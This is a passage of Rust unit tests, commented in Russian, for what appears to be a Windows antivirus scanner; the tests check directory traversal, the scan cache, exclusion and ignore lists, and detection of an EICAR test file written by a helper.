        // Файл ровно один: в junction не заходили.
        assert_eq!(progress.scanned, 1, "обход зашёл в junction");
    }

    #[test]
    fn mode_roundtrip() {
        assert_eq!(Mode::from_str("quick"), Some(Mode::Quick));
        assert_eq!(Mode::from_str("full"), Some(Mode::Full));
        assert_eq!(Mode::from_str("other"), None);
        assert_eq!(Mode::Quick.as_str(), "quick");
    }

    #[test]
    fn cache_key_changes_with_size_and_time() {
        let a = ScanCache::key(r"C:\a\b.exe", 100, 1000);
        assert_eq!(a, ScanCache::key(r"c:\A\B.EXE", 100, 1000), "регистр пути не важен");
        assert_ne!(a, ScanCache::key(r"C:\a\b.exe", 101, 1000), "размер учтён");
        assert_ne!(a, ScanCache::key(r"C:\a\b.exe", 100, 1001), "время учтено");
        assert_ne!(a, ScanCache::key(r"C:\a\c.exe", 100, 1000), "путь учтён");
    }

    #[test]
    fn cached_file_is_not_read_again() {
        let dir = temp_dir("cache");
        let file = dir.join("app.exe");
        std::fs::write(&file, b"MZ clean").unwrap();

        let mut cache = ScanCache::empty();
        let meta = std::fs::metadata(&file).unwrap();
        let mtime = meta
            .modified()
            .ok()
            .and_then(|t| t.duration_since(std::time::UNIX_EPOCH).ok())
            .map(|d| d.as_secs())
            .unwrap_or(0);
        // Обход работает с полными именами, поэтому и ключ считаем по нему.
        let long = long_path(&file.to_string_lossy());
        cache.remember(ScanCache::key(&long, meta.len(), mtime));

        let cancel = AtomicBool::new(false);
        let mut p = Progress::default();
        let mut found = Vec::new();
        walk(&dir, Mode::Quick, &[], &[], &test_heur(), &[], &mut cache, &cancel, &mut p, &mut found, &mut |_, _| {});
        assert_eq!(p.scanned, 0, "файл из кеша не должен читаться");
        assert_eq!(p.cached, 1);
    }

    // ---------- Исключения и игнорируемые ----------

    #[test]
    fn list_matches_file_and_folder() {
        let list = vec![r"c:\games\bad.exe".to_string(), r"c:\temp\junk".to_string()];
        assert!(is_listed(&list, r"C:\Games\bad.exe"));
        // Файл внутри исключённой папки тоже исключён.
        assert!(is_listed(&list, r"C:\Temp\junk\a.exe"));
        assert!(is_listed(&list, r"C:\Temp\junk\sub\b.exe"));
        // Похожее имя, но другая папка — не исключено.
        assert!(!is_listed(&list, r"C:\Games\bad2.exe"));
        assert!(!is_listed(&list, r"C:\Temp\junk2\a.exe"));
        assert!(!is_listed(&[], r"C:\anything.exe"));
    }

    #[test]
    fn add_to_list_is_idempotent() {
        let dir = temp_dir("lists");
        let file = dir.join("exclusions.txt");
        add_to_list(&file, r"C:\a\b.exe").unwrap();
        add_to_list(&file, r"C:\A\B.EXE").unwrap();
        let list = load_list(&file);
        assert_eq!(list.len(), 1, "дубликат не должен добавляться");
        assert_eq!(list[0], r"c:\a\b.exe");
    }

    #[test]
    fn load_list_skips_comments_and_blanks() {
        let dir = temp_dir("lists-comments");
        let file = dir.join("exclusions.txt");
        std::fs::write(&file, "# комментарий\n\nC:\\a.exe\n  \nC:\\b.exe\n").unwrap();
        let list = load_list(&file);
        assert_eq!(list, vec![r"c:\a.exe".to_string(), r"c:\b.exe".to_string()]);
    }

    #[test]
    fn add_to_list_rejects_empty() {
        let dir = temp_dir("lists-empty");
        let file = dir.join("exclusions.txt");
        assert!(add_to_list(&file, "   ").is_err());
    }

    #[test]
    fn excluded_file_is_skipped_by_walk() {
        let dir = temp_dir("excluded-walk");
        let bad = dir.join("bad.com");
        write_eicar(&bad);
        std::fs::write(dir.join("clean.exe"), b"MZ clean").unwrap();

        let cancel = AtomicBool::new(false);
        let exclusions = vec![long_path(&bad.to_string_lossy()).to_lowercase()];
        let mut p = Progress::default();
        let mut found = Vec::new();
        let mut cache = ScanCache::empty();
        walk(&dir, Mode::Quick, &[], &[], &test_heur(), &exclusions, &mut cache, &cancel, &mut p, &mut found, &mut |_, _| {});
        assert_eq!(p.scanned, 1, "исключённый файл не должен проверяться");
        assert!(found.is_empty());
    }

    #[test]
    fn ignored_findings_are_filtered_from_result() {
        let dir = temp_dir("ignored-run");
        let bad = dir.join("bad.com");
        write_eicar(&bad);

        let cancel = AtomicBool::new(false);
        // Находка хранит полное имя, поэтому и в списке должно быть полное.
        let ignored = vec![long_path(&bad.to_string_lossy()).to_lowercase()];
        let mut p = Progress::default();
        let mut found = Vec::new();
        // Обходим папку напрямую: run() берёт системные пути.
        let mut cache = ScanCache::empty();
        walk(&dir, Mode::Quick, &[], &[], &test_heur(), &[], &mut cache, &cancel, &mut p, &mut found, &mut |_, _| {});
        assert_eq!(found.len(), 1, "файл должен быть найден");
        let visible: Vec<&Threat> = found
            .iter()
            .filter(|t| !is_listed(&ignored, &t.path))
            .collect();
        assert!(visible.is_empty(), "игнорируемая находка не должна показываться");
    }
}
